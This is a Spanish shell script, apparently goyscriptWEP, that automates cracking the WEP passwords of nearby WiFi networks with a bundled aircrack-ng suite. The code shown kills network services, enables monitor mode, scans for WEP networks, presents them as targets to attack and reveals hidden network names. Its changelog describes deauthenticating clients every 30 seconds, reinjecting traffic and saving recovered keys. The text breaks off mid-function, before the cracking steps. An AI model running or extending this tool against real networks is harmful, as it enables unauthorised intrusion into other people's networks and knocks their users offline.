
 
#!/bin/sh

# CAMBIOS
# versión 1.0
#	- version inicial
# versión 1.1
#	- reorganizadas las columnas del listado de redes detectadas (para evitar que los nombres
#	  de red largos invadan la linea siguiente.
#	- añadido color amarillo al listado de redes detectadas, para indicar que existen capturas previas
#	- añadido el parámetro "-l" o "--lista" para omitir la búsqueda de redes y usar las
#	  encontradas en la búsqueda anterior. Si no existiera búsqueda anterior, se obvia.
#	- cambiada la carpeta de trabajo a "wep" para evitar conflictos con goyscriptWPA
#	- cambiada la carpeta de contraseñas de "wifis" a "claves" (me parece un nombre más acertado)
# versión 1.2
#	- corregido bug "wicd"
# versión 1.3
#	- corregido bug "networkmanager" (por USUARIONUEVO)
# versión 1.4
#	- implementada compatibilidad con Backtrack (y quizá otras como Ubuntu)
#	- se mata NetworkManager antes de buscar redes (interfería con el proceso)
# versión 1.5
#	- corrección de errores
#	- ahora cuando se consigue la contraseña o se cancela el proceso, aparece el menú de selección de red
#	  (para cancelar el proceso y seleccionar otra red se debe cerrar manualmente la ventana de captura de
#	  tráfico)
#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2275)
# versión 1.6
#	- corregido bug en Backtrack
# versión 1.7
#	- mejorada la compatibilidad entre distribuciones
# versión 1.8
#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2288)
# versión 2.7
#	- Cambiado el sistema de numeración de la versión de los scripts para evitar confusiones
#	  (ahora todos los scripts muestran la misma versión)
#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2307)
#	- corregido bug sobre la detección de la MAC de la interfaz en algunas distribuciones
# versión 2.8
#	- Corregido bug en Kali linux y BackTrack
#	- Añadido parámetro "--datos" para poder pasar todos los parámetros necesarios
#	  (imprescindible para poder funcionar con el launcher, pero se puede usar sin él)
#	- Reemplazado el parámetro "--lista" por "-L" (más cómodo)
#	- Corregida la función de cierre de ventanas al cancelar u obtener la contraseña
#	  (algunas se quedaban abiertas)
# versión 2.9
#	- Mejoras estéticas
# versión 3.0
#	- Ahora al cancelar el proceso de descubrir red oculta se vuelve al menú de
#	  selección de redes
#	- Ahora se comprueba al inicio si el dispositivo de almacenamiento es de
#	  sólo lectura
# versión 3.1
#	- Solucionado bug al cerrar la ventana de reinyección con cliente real (o eso creo)
#	- Ahora se comprueba si se tienen permisos de root para poder ejecutar el script
#	- Ahora se desactiva el modo monitor y se inicia wicd al cerrar el script
# versión 3.2
#	- Corrección de errores
# versión 3.3.1
#	- Modificado el tiempo entre expulsiones de clientes a 30 segundos (antes 5)
# versión 3.4
#	- Corregido bug al intentar auditar una red ya auditada
#	- Ahora se puede usar sin interfaz gráfica (con goyscriptTTY)
#	- Añadida compatibilidad con OpenWrt


##### CONSTANTES #####

negro="\033[0;30m"
rojo="\033[0;31m"
verde="\033[0;32m"
marron="\033[0;33m"
azul="\033[0;34m"
magenta="\033[0;35m"
cyan="\033[01;36m"
grisC="\033[0;37m"
gris="\033[1;30m"
rojoC="\033[1;31m"
verdeC="\033[1;32m"
amarillo="\033[1;33m"
azulC="\033[1;34m"
magentaC="\033[1;35m"
cyanC="\033[1;36m"
blanco="\033[1;37m"
subrayar="\E[4m"
parpadeoON="\E[5m"
parpadeoOFF="\E[0m"
resaltar="\E[7m"

WRT=`ps | grep goyscriptWRT | grep -v grep`
if [ "$WRT" = "" ] #si no se está usando goyscriptWRT
then
	AIRCRACK="./software/./aircrack-ng"
	AIREPLAY="./software/./aireplay-ng -R --ignore-negative-one"
	AIRMON="./software/./airmon-ng"
	AIRODUMP="./software/./airodump-ng"
	PACKETFORGE="./software/./packetforge-ng"
	PARAMETRO_PS="-A"
else
	AIRCRACK="aircrack-ng"
	AIREPLAY="aireplay-ng -R --ignore-negative-one"
	AIRMON="airmon-ng"
	AIRODUMP="airodump-ng"
	PACKETFORGE="packetforge-ng"
	PARAMETRO_PS=""
fi
XXD="./software/./xxd"
JAZZTELDECRYPTER="./software/./jazzteldecrypter"
WLANDECRYPTER="./software/./wlandecrypter"
WLAN4xx="./software/./wlan4xx"
FABRICANTE="software/./fabricante.sh"
SCREEN="screen"
TMP="tmp"
PID=$$

CAPTURA="wep"	#CARPETA DE TRABAJO
CLAVES="claves"	#CARPETA DONDE SE GUARDAN LAS CONTRASEÑAS
VERSION=$(cat VERSION)
let ESPERA=30 #segundos entre expulsiones de clientes

#LOS SIGUIENTES PARÁMETROS SE APLICAN POR DEFECTO CUANDO NO ES POSIBLE
#DETECTAR LA RESOLUCIÓN DE LA PANTALLA. ESTAN OPTIMIZADOS PARA UNA
#RESOLUCIÓN DE 1024x768 PORQUE LA MAYORÍA DE LAS DISTRIBUCIONES DE
#LINUX ES LA QUE USAN POR DEFECTO
HOLD="-hold"
HOLD=""
NORMAL="-fg black -bg white"
INFORMA="-fg black -bg yellow"
MAL="-fg black -bg red"
BIEN="-fg black -bg green"
FUENTE="-fs 8"
BUSCAR_REDES_VENTANA="-geometry 100x100-0+0"
AIRODUMP_VENTANA="-geometry 90x11-0-0"
ASOCIACION_VENTANA="-geometry 90x3-0+0"
ATAQUE2_VENTANA="-geometry 90x3-0+70"
ATAQUE3_1_VENTANA="-geometry 90x3-0+140"
ATAQUE3_2_VENTANA="-geometry 90x3-0+210"
ATAQUE4_VENTANA="-geometry 90x3-0+280"
ATAQUE5_VENTANA="-geometry 90x3-0+350"
ATAQUE6_VENTANA="-geometry 90x3-0+420"
ATAQUE7_VENTANA="-geometry 90x3-0+490"
AIRCRACK_VENTANA="-geometry 70x23+0-0"

#CALCULAMOS LA RESOLUCIÓN DE LA PANTALLA. DEPENDIENDO DE LA VERSION DE "xrandr" SE RECORTA DE UNA FORMA U OTRA
which xdpyinfo > /dev/null 2>&1
if [ $? -eq 0 ]
then
	RESOLUCION=`xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3`
else
	which xrandr > /dev/null 2>&1
	if [ $? -eq 0 ]
	then
		RESOLUCION=`xrandr | grep "*" | awk '{print $1}'`
		RESOLUCION=`echo $RESOLUCION | grep "x"`
		if [ "$RESOLUCION" = "" ]
		then
			RESOLUCION=`xrandr | grep "current" | awk -F "current" '{print $2}' | awk -F " " '{print $1$2$3}' | awk -F "," '{print $1}'`
			RESOLUCION=`echo $RESOLUCION | grep "x"`
		fi
		if [ "$RESOLUCION" = "" ]
		then
			RESOLUCION=`xrandr | grep "*" | awk '{print $2$3$4}'`
			RESOLUCION=`echo $RESOLUCION | grep "x"`
		fi
	else
		which Xvesa > /dev/null 2>&1
		if [ $? -eq 0 ]
		then
			RESOLUCION=`Xvesa -listmodes 2>&1 | grep ^0x | awk '{ printf "%s %s\n",$2,$3 }' | sort -n | grep x[1-2][4-6] | tail -n 1 | awk -F 'x' '{print $1"x"$2}'` 
		else
			RESOLUCION=""
		fi
	fi
fi
case $RESOLUCION in
	1920x1080)
		FUENTE="-fn 9x15bold"
		BUSCAR_REDES_VENTANA="-geometry 105x100-0+0"
		AIRODUMP_VENTANA="-geometry 100x18-0-0"
		ASOCIACION_VENTANA="-geometry 100x5-0+0"
		ATAQUE2_VENTANA="-geometry 100x5-0+105"
		ATAQUE3_1_VENTANA="-geometry 100x2-0+210"
		ATAQUE3_2_VENTANA="-geometry 100x3-0+270"
		ATAQUE4_VENTANA="-geometry 100x3-0+345"
		ATAQUE5_VENTANA="-geometry 100x5-0+420"
		ATAQUE6_VENTANA="-geometry 100x5-0+525"
		ATAQUE7_VENTANA="-geometry 100x5-0+630"
		AIRCRACK_VENTANA="-geometry 80x25+0-0";;
	1280x1024)
		FUENTE="-fs 8"
		AIRODUMP_VENTANA="-geometry 100x31-0-0"
		ASOCIACION_VENTANA="-geometry 100x3-0+0"
		ATAQUE2_VENTANA="-geometry 100x3-0+70"
		ATAQUE3_1_VENTANA="-geometry 100x3-0+140"
		ATAQUE3_2_VENTANA="-geometry 100x3-0+210"
		ATAQUE4_VENTANA="-geometry 100x3-0+280"
		ATAQUE5_VENTANA="-geometry 100x3-0+350"
		ATAQUE6_VENTANA="-geometry 100x3-0+420"
		ATAQUE7_VENTANA="-geometry 100x3-0+490"
		AIRCRACK_VENTANA="-geometry 80x25+0-0";;
	1280x800)
		FUENTE="-fs 8"
		AIRODUMP_VENTANA="-geometry 100x14-0-0"
		ASOCIACION_VENTANA="-geometry 100x3-0+0"
		ATAQUE2_VENTANA="-geometry 100x3-0+70"
		ATAQUE3_1_VENTANA="-geometry 100x3-0+140"
		ATAQUE3_2_VENTANA="-geometry 100x3-0+210"
		ATAQUE4_VENTANA="-geometry 100x3-0+280"
		ATAQUE5_VENTANA="-geometry 100x3-0+350"
		ATAQUE6_VENTANA="-geometry 100x3-0+420"
		ATAQUE7_VENTANA="-geometry 100x3-0+490"
		AIRCRACK_VENTANA="-geometry 80x25+0-0";;
	1024x600)
		FUENTE="-fs 8"
		BUSCAR_REDES_VENTANA="-geometry 100x100-0+0"
		AIRODUMP_VENTANA="-geometry 90x11-0-0"
		ASOCIACION_VENTANA="-geometry 90x2-0+0"
		ATAQUE2_VENTANA="-geometry 90x2-0+55"
		ATAQUE3_1_VENTANA="-geometry 90x2-0+110"
		ATAQUE3_2_VENTANA="-geometry 90x2-0+165"
		ATAQUE4_VENTANA="-geometry 90x1-0+220"
		ATAQUE5_VENTANA="-geometry 90x1-0+262"
		ATAQUE6_VENTANA="-geometry 90x1-0+304"
		ATAQUE7_VENTANA="-geometry 90x1-0+348"
		AIRCRACK_VENTANA="-geometry 70x23+0-0";;
	"")
		RESOLUCION=""$rojoC"[no detectada]";;
esac

case $TERM in #EN DISTRIBUCIONES COMO BEINI, LOS PARAMETROS DE LA CONSOLA SON DISTINTOS
	rxvt)
		parpadeoON=""
		NORMAL="+sb -fg black -bg white"
		INFORMA="+sb -fg black -bg yellow"
		MAL="+sb -fg black -bg red"
		BIEN="+sb -fg black -bg green"
		HOLD=""
		FUENTE=""
		BUSCAR_REDES_VENTANA="-geometry 100x59-0+0"
		AIRODUMP_VENTANA="-geometry 100x18-0-0"
		ASOCIACION_VENTANA="-geometry 100x2-0+0"
		ATAQUE2_VENTANA="-geometry 100x3-0+70"
		ATAQUE3_1_VENTANA="-geometry 100x3-0+140"
		ATAQUE3_2_VENTANA="-geometry 100x3-0+210"
		ATAQUE4_VENTANA="-geometry 100x3-0+280"
		ATAQUE5_VENTANA="-geometry 100x3-0+350"
		ATAQUE6_VENTANA="-geometry 100x3-0+420"
		ATAQUE7_VENTANA="-geometry 100x3-0+490"
		AIRCRACK_VENTANA="-geometry 70x23+0-0";;
esac

IVS=0
TEMP=""

#############
# FUNCIONES #
#############

#COMPRUEBA SI AIRODUMP ESTA ABIERTO
comprobar_airodump()
{
AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
}

#HORA DE INICIO
hora_inicio()
{
ano1=`date +%Y`
mes1=`date +%m`
dia1=`date +%d`
hora1=`date +%H`
minutos1=`date +%M`
segundos1=`date +%S`
segundos_del_ano1=`date +%s`
}

#HORA DE FINALIZACION
hora_fin()
{
ano2=`date +%Y`
mes2=`date +%m`
dia2=`date +%d`
hora2=`date +%H`
minutos2=`date +%M`
segundos2=`date +%S`
segundos_del_ano2=`date +%s`
}

#DIFERENCIA DE TIEMPO ENTRE "HORA DE INICIO" Y "HORA DE FINALIZACION"
calcular_tiempo()
{
let segundos=$segundos_del_ano2-$segundos_del_ano1
let minutos=0
let horas=0
let dias=0
let dias=$segundos/86400
let segundos=$segundos%86400
let horas=$segundos/3600
let segundos=$segundos%3600
let minutos=$segundos/60
let segundos=$segundos%60
}

#DETIENE POSIBLES PROCESOS EN MARCHA
matar_procesos()
{
echo -e "$cyan""\n$1"
echo -e "$grisC"
PROCESOS=`ps $PARAMETRO_PS | grep -e xterm -e airodump-ng -e aircrack-ng -e aireplay-ng -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc | grep -v grep`
while [ "$PROCESOS" != "" ]
do
	killall -q xterm airodump-ng aircrack-ng aireplay-ng ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplicant udhcpc > /dev/null 2>&1
	PROCESOS=`ps $PARAMETRO_PS | grep -e xterm -e airodump-ng -e aircrack-ng -e aireplay-ng -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc | grep -v grep`
done
kill `ps $PARAMETRO_PS | grep goyscriptWEP | awk '{print $1}' | grep -v $PID | grep -v grep` > /dev/null 2>&1
}

#BORRA ARCHIVOS DE SESIONES ANTERIORES
borrar_sesiones_anteriores()
{
if [ -d "./$CAPTURA" ]
then
	echo -e ""$cyan"Borrando archivos temporales de sesiones anteriores..."$grisC""
	echo
	mv $CAPTURA/wifis.csv $CAPTURA/anteriorCSV.wifis > /dev/null 2>&1
	mv $CAPTURA/clientes_wep.csv $CAPTURA/anteriorCSV.wifis-wep-clientes > /dev/null 2>&1
	rm -rf $CAPTURA/red_oculta*  > /dev/null 2>&1
	rm -rf $CAPTURA/ataque4.cap > /dev/null 2>&1
	rm -rf $CAPTURA/ataque5.cap > /dev/null 2>&1
	rm -rf $CAPTURA/wifis* > /dev/null 2>&1
	rm -rf $CAPTURA/*.kismet.csv > /dev/null 2>&1
	rm -rf $CAPTURA/*.kismet.netxml > /dev/null 2>&1
	rm -rf $CAPTURA/*.csv > /dev/null 2>&1
	rm -rf $CAPTURA/diccionario* > /dev/null 2>&1
	rm -rf replay_* > /dev/null 2>&1
	rm -rf "$TMP" > /dev/null 2>&1
fi
mkdir "$CAPTURA" > /dev/null 2>&1
mkdir "$TMP"  > /dev/null 2>&1 # CARPETA NECESARIA PARA GUARDAR ARCHIVOS TEMPORALES DE AIREPLAY-NG
mkdir "$CLAVES"  > /dev/null 2>&1
rm -rf *.cap > /dev/null 2>&1
rm -rf *.xor > /dev/null 2>&1
rm -rf temp > /dev/null 2>&1
}

#NOMBRE Y VERSIÓN DEL SCRIPT
version()
{
if [ "$DESDE_DATOS" = "NO" ]
then
	clear
fi
SCRIPT=" GOYscriptWEP $VERSION by GOYfilms "
N_SCRIPT=${#SCRIPT}
N_VERSION=${#VERSION}
let CARACTERES=$N_SCRIPT*3
LINEA=`echo "══════════════════════════════════════════" | cut -c-${CARACTERES}`
echo -e "$blanco\c"
echo -e "╔${LINEA}╗"
echo -e "║${SCRIPT}║"
echo -e "╚${LINEA}╝"
echo -e $grisC
}

#SELECCION DE TARJETA WiFi
seleccionar_tarjeta()
{
INTERFAZ=0
INTERFAZ_MONITOR=0
$AIRMON stop mon0 > /dev/null 2>&1
TARJETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | sort`
N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
then
	echo -e ""$rojoC"ERROR: No se detectó ninguna tarjeta WiFi"
	echo -e "$grisC"
	pulsar_una_tecla "Pulsa una tecla para salir..."
else
	echo -e ""$cyan"Tarjetas WiFi disponibles:"$grisC""
	echo
	x=1
	while [ $x -le $N_TARJETAS_WIFI ]
	do
		INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
		DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
		MAC=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}' | cut -c-8` #extraemos la MAC XX:XX:XX (sólo los 3 primeros pares)
		FABRICANTE_INTERFAZ=`$FABRICANTE "$MAC"`
		if [ $x -eq 1 ]
		then
			echo -e ""$cyan" Nº\tINTERFAZ\tDRIVER\t\tFABRICANTE"
			echo -e ""$cyan" ══\t════════\t══════\t\t══════════"
		fi
		CARACTERES_DRIVER=`echo $DRIVER | wc -c` 
		if [ $CARACTERES_DRIVER -gt 8 ] #CONTROLA LA TABULACION DEPENDIENDO DE LOS CARACTERES QUE TENGA LA VARIABLE "DRIVER"
		then
			TAB=""
		else
			TAB="\t"
		fi
		echo -e ""$amarillo" $x)\t$INTERFAZ \t\t$DRIVER\t"$TAB"$FABRICANTE_INTERFAZ"
		x=$((x+1))
	done
	if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MAS DE UNA NOS PREGUNTA CUAL QUEREMOS
	then
		echo -e "\n"$cyan"\nSelecciona una tarjeta WiFi:\c"
		echo -e ""$amarillo" \c"
		read -n 1 OPCION
		while [[ $OPCION < 1 ]] || [[ $OPCION > $N_TARJETAS_WIFI ]]
		do
			echo -en "\a\033[10C"$rojoC"OPCIÓN NO VÁLIDA"$grisC""
			echo -en ""$cyan"\rSelecciona una tarjeta WiFi: "$amarillo"\c"
			read -n 1 OPCION
		done
	else
		OPCION=1
	fi
	echo -en "\a\033[10C                 "$grisC"" #BORRA EL MENSAJE DE "OPCION NO VALIDA"
fi
if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MAS DE UNA VARIA EL MENSAJE
then
	INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$OPCION'}'`
	echo -e "\n"
	echo -e ""$cyan"Has seleccionado: "$verdeC"$INTERFAZ"$grisC""
	echo
else
	echo
	echo -e ""$cyan"Sólo se ha detectado una tarjeta WiFi: "$verdeC"$INTERFAZ"$grisC""
	echo
fi
}

#MUESTRA LA RESOLUCION DE PANTALLA ACTUAL
mostrar_resolucion_de_pantalla()
{
echo -e ""$cyan"Resolución de pantalla actual: "$verdeC"$RESOLUCION"$grisC""
echo
}

#INICIALIZACION DE LA TARJETA
iniciar_tarjeta()
{
echo -e ""$cyan"Iniciando la tarjeta WiFi..."$grisC""
echo
ifconfig $INTERFAZ down
ifconfig $INTERFAZ up
iwconfig $INTERFAZ rate 1M
}

#ACTIVA EL MODO MONITOR DE LA INTERFAZ
activar_modo_monitor()
{
software/./reiniciar_interfaz.sh $INTERFAZ
MAC_INTERFAZ=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}'` #extraemos la MAC de la interfaz del comando 'ifconfig'
echo -e ""$cyan"Activando modo monitor en $blanco$INTERFAZ $grisC("$MAC_INTERFAZ")$cyanC..."$grisC""
$AIRMON start $INTERFAZ $CANAL
ifconfig mon0 > /dev/null 2>&1
if [ $? = 0 ] #SI LA ORDEN ANTERIOR SE COMPLETO CORRECTAMENTE, SIGNIFICA QUE EXISTE LA INTERFAZ "mon0"
then
	INTERFAZ_MONITOR=mon0
else
	INTERFAZ_MONITOR=$INTERFAZ
fi
}

#BÚSQUEDA DE REDES WEP
buscar_redes()
{
if [ -x "/etc/rc.d/rc.wicd" ]; then
   killwicd > /dev/null 2>&1
else	
   /etc/rc.d/rc.networkmanager stop > /dev/null 2>&1
fi
echo -e "$cyan$parpadeoON"
echo -e "╔════════════════════════════════╗"
echo -e "║                                ║"
echo -e "║$parpadeoOFF "$cyan" PULSA CONTROL+C PARA DETENER  $parpadeoON║"
echo -e "║$parpadeoOFF "$cyan" LA  BÚSQUEDA  Y  SELECCIONAR  $parpadeoON║"
echo -e "║$parpadeoOFF "$cyan" UNA DE LAS REDES DETECTADAS   $parpadeoON║"
echo -e "║                                ║"
echo -e "╚════════════════════════════════╝"
echo -e "$parpadeoOFF""$grisC"
xterm $NORMAL $FUENTE $BUSCAR_REDES_VENTANA -title "BUSCANDO REDES WiFi" -e $AIRODUMP --encrypt WEP -w ./$CAPTURA/wifis $INTERFAZ_MONITOR
let LINEAS_AP=`cat $CAPTURA/wifis-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'` #Nº LINEAS HASTA "Station" o "Cliente" (si se usa el airodump-ng traducido) :D
let LINEAS_AP=$LINEAS_AP-1 #RESTAMOS 1 PARA ELIMINAR TAMBIEN LA LINEA "Station"
head -n $LINEAS_AP $CAPTURA/wifis-01.csv &> $CAPTURA/wifis.csv #GUARDAMOS EN UN ARCHIVO LOS APs
tail -n +$LINEAS_AP $CAPTURA/wifis-01.csv &> $CAPTURA/clientes_wep.csv #GUARDAMOS EN OTRO LOS CLIENTES
clear
LINEAS_WIFIS_CSV=`wc -l $CAPTURA/wifis.csv | awk '{print $1}'`
if [ $LINEAS_WIFIS_CSV -le 3 ] 	#SI EL ARCHIVO "wifis.csv" TIENE 3 LINEAS
then				#ES QUE NO SE DETECTÓ NINGUNA RED
	echo -e "$rojoC"
	echo "No se encontró ninguna red WiFi con contraseña WEP."
	echo -e "$grisC"
	pulsar_una_tecla "Pulsa una tecla para salir..."
fi
rm -rf $CAPTURA/wifis.goy > /dev/null 2>&1
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
do
	caracteres_mac=${#MAC}
	if [ $caracteres_mac -ge 17 ]
	then
		let i=$i+1
		POWER=`echo "$POWER" | sed 's/ //g'`
		if [[ $POWER -lt 0 ]]
		then
			if [[ $POWER -eq -1 ]]
			then
				let POWER=0
			else
				let POWER=$POWER+100
			fi
		fi
		IV=`echo $IV | sed 's/ //g'` #CORRIGE LOS IVs RECORTANDO LOS ESPACIOS
		ESSID=`echo "$ESSID" | sed 's/^ //'` #CORRIGE EL NOMBRE DE LA RED WiFi RECORTANDO EL ESPACIO DEL PRINCIPIO
		if [ $CHANNEL -gt 13 ] || [ $CHANNEL -lt 1 ] #SI EL CANAL NO ESTA ENTRE 1 Y 13 ENTONCES NO ES VALIDO
		then
			let CHANNEL=0
		else
			CHANNEL=`echo $CHANNEL | sed 's/ //g'` #CORRIGE EL CANAL ELIMINANDO LOS ESPACIOS
		fi
		if [ "$ESSID" = "" ] || [ "$CHANNEL" = "-1" ] #SI EL NOMBRE DE LA RED ESTA VACIO ES QUE ES UNA RED OCULTA
		then
			ESSID="< Oculta >"
		fi
		echo -e "$MAC,$CHANNEL,$IV,$POWER,$ESSID" >> $CAPTURA/wifis.goy
	fi
done < $CAPTURA/wifis.csv
sort -t "," -d -k 4 "$CAPTURA/wifis.goy" > "$CAPTURA/redes_wep.goy"
}

#SELECCION DE LA RED A ATACAR
seleccionar_red()
{
clear
clear # DOS VECES PARA BORRAR TAMBIÉN LOS MENSAJES DE 'kill'
echo -e ""$cyan"\c"
echo "          Redes WiFi detectadas con contraseña WEP        "
echo "          ════════════════════════════════════════        "
echo
echo "  Nº          MAC         CANAL  IVs  SEÑAL  NOMBRE DE RED"
echo "  ══   ═════════════════  ═════  ═══  ═════  ═════════════"
i=0
while IFS=, read MAC CANAL IV POTENCIA ESSID
do
	i=$(($i+1))
	if [ $i -le 9 ] #ALINEA A LA DERECHA EL NUMERO DE OPCION
	then
		ESPACIO1=" "
	else
		ESPACIO1=""
	fi
	if [[ $CANAL -le 9 ]] #ALINEA A LA DERECHA EL CANAL
	then
		ESPACIO2=" "
		if [[ $CANAL -eq 0 ]]
		then
			CANAL="-"
		fi
	else
		ESPACIO2=""
	fi
	if [[ $IV -le 9 ]] #ALINEA A LA DERECHA LOS IVs
	then
		ESPACIO3=" "
	else
		ESPACIO3=""
	fi
	if [[ "$POTENCIA" = "" ]]
	then
		POTENCIA=0
	fi
	if [[ $POTENCIA -le 9 ]] #ALINEA A LA DERECHA LA POTENCIA DE LA SEÑAL
	then
		ESPACIO4=" "
	else
		ESPACIO4=""
	fi
	if [[ $IV -eq 0 ]] #SI NO SE HAN CAPTURADO IVs LO CAMBIAMOS POR "-" PORQUE DESTACA MENOS QUE UN "0"
	then
		IV="-"
	else
		if [[ $IV -gt 99 ]]
		then
			IV=99
		fi
	fi
	MAC_GUIONES=`echo $MAC | sed 's/:/-/g'`
	YA_TENEMOS_LA_CLAVE=`find "$CLAVES" | grep "$ESSID ($MAC_GUIONES).txt"`
	CAPTURA_ANTERIOR=`ls -l $CAPTURA | grep "$ESSID ($MAC_GUIONES)*"`
	if [ ! "$YA_TENEMOS_LA_CLAVE" = "" ] #CAMBIAMOS EL COLOR DE LA LINEA DEPENDIENDO DE VARIOS FACTORES
	then				    #SI YA TENEMOS LA CONTRASEÑA: MAGENTA
		echo -e "$magenta\c"
	else
		if [ "$ESSID" = "< Oculta >" ] #SI LA RED ESTA OCULTA: ROJO
		then
			echo -e "$rojoC\c"
		else
			if [ "$CAPTURA_ANTERIOR" != "" ] #SI TENEMOS GUARDADAS CAPTURAS ANTERIORES: MARRÓN
			then
				echo -e "$marron\c"
			else
				echo -e "$blanco\c"
			fi
		fi
	fi
	CLIENTE=`cat $CAPTURA/clientes_wep.csv | grep $MAC`
	if [ "$CLIENTE" != "" ]
	then
		CLIENTE="#" #MUESTRA UNA ALMOHADILLA EN LAS REDES QUE TIENEN CLIENTES CONECTADOS
		ESPACIO5=""
	else
		ESPACIO5=" "
	fi
	nombres_ap[$i]=$ESSID
	canales[$i]=$CANAL
	macs[$i]=$MAC
	echo -e " $ESPACIO1$i)$CLIENTE  $ESPACIO5$MAC   $ESPACIO2$CANAL    $ESPACIO3$IV    $ESPACIO4$POTENCIA%   $ESSID"
done < "$CAPTURA/redes_wep.goy"
echo
if [ $i -eq 1 ] #SI SÓLO SE HA DETECTADO UNA RED LA SELECCIONARÁ AUTOMÁTICAMENTE ;-D
then
	SELECCION=1
else
	echo -e ""$cyan"\rSelecciona una red de la lista: "$amarillo"\c"
	read SELECCION
fi
while [[ $SELECCION -lt 1 ]] || [[ $SELECCION -gt $i ]]
do
	echo -en "\a\033[1A\033[40C"$rojoC"OPCIÓN NO VÁLIDA"$grisC""
	echo -en "\a\r"$cyan"Selecciona una red de la lista: "$amarillo"\c"
	read SELECCION
done
#NOMBRE_AP=${nombres_ap[$SELECCION]}
#CANAL=${canales[$SELECCION]}
#MAC_AP=${macs[$SELECCION]}
echo -e "\a\033[1A\033[40C                "$grisC"" #BORRA EL MENSAJE DE "OPCIÓN NO VÁLIDA"
MAC_GUIONES=`echo $MAC_AP | sed 's/:/-/g'`
if [ "$NOMBRE_AP" = "< Oculta >" ]
then
	echo -e $rojoC
	echo -e "Has seleccionado una red oculta."
	echo -e "Hay que averiguar algunos datos antes de poder continuar."
	echo -e $grisC
	NOMBRE_AP=""
	descubrir_red_oculta
fi
}

#DESCUBRE LOS DATOS QUE FALTAN DE UNA RED OCULTA
descubrir_red_oculta()
{
rm -rf "$CAPTURA"/red_oculta* > /dev/null 2>&1
if [ "$CANAL" = "-" ] || [ $CANAL -lt 1 ] || [ $CANAL -gt 13 ] #SI EL CANAL NO ES VÁLIDO, SE BUSCA EL CANAL CORRECTO.
then
	echo -e $cyan"\r   Buscando CANAL... "$grisC" \c"
	xterm -bg white -fg black $AIRODUMP_VENTANA -title "Buscando el canal de $MAC_AP" -e $AIRODUMP --bssid $MAC_AP -w "$CAPTURA/red_oculta_canal" $INTERFAZ_MONITOR &
	CANAL=""
	AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
	while [ "$AIRODUMP_FUNCIONANDO" = "" ]
	do
		AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
	done
	while [[ "$CANAL" = "" ]] || [[ $CANAL -gt 13 ]] || [[ $CANAL -lt 1 ]]
	do
		if [ -e "$CAPTURA/red_oculta_canal-01.csv" ]
		then
			CANAL=`cat $CAPTURA/red_oculta_canal-01.csv | head -n 3 | tail -n 1 | awk -F ',' '{print $4}' | sed 's/ //g'`
			NOMBRE_AP=`cat $CAPTURA/red_oculta_canal-01.csv | head -n 3 | tail -n 1 | awk -F ',' '{print $14}' | sed "s/^.\(.*\)/\1/"`
		fi
		AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
		if [ "$AIRODUMP_FUNCIONANDO" = "" ]
		then
			break
		fi
	done
	if [[ $CANAL -ge 1 ]] && [[ $CANAL -le 13 ]]
	then
		echo -e $verdeC"Encontrado: $blanco$CANAL"
		echo -e $grisC
		if [ "$NOMBRE_AP" != "" ]
		then
			echo -e $cyan"\r   Buscando NOMBRE DE RED...$verdeC Encontrado: $blanco\"$NOMBRE_AP\""
			echo -e $grisC
		fi
	fi
	killall -w airodump-ng > /dev/null 2>&1
fi
if [[ $CANAL -ge 1 ]] && [[ $CANAL -le 13 ]] && [[ "$NOMBRE_AP" = "" ]]
then
	echo -e $cyan"\r   Buscando NOMBRE DE RED... "$grisC" \c"
	if [ "$NOMBRE_AP" = "" ]
	then
		xterm -bg white -fg black $AIRODUMP_VENTANA -title "Buscando el nombre de red de $MAC_AP" -e $AIRODUMP --bssid $MAC_AP -c $CANAL,$CANAL -w "$CAPTURA/red_oculta_nombre" $INTERFAZ_MONITOR &
		NOMBRE_AP=""
		CLIENTE=""
		AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
		while [ "$AIRODUMP_FUNCIONANDO" = "" ]
		do
			AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
		done
		while [ "$NOMBRE_AP" = "" ] #BUSCAMOS EL NOMBRE DE LA RED
		do
			if [ -e "$CAPTURA/red_oculta_nombre-01.csv" ]
			then
				NOMBRE_AP=`cat $CAPTURA/red_oculta_nombre-01.csv | head -n 3 | tail -n 1 | awk -F ',' '{print $14}' | sed "s/^.\(.*\)/\1/"`
				CLIENTE=`cat $CAPTURA/red_oculta_nombre-01.csv | tail -n 2 | head -n 1 | awk -F ',' '{print $1}'`
				if [ "$NOMBRE_AP" != "" ]
				then
					break
				fi
				SLEEP=`ps $PARAMETRO_PS | grep sleep | grep -v grep`
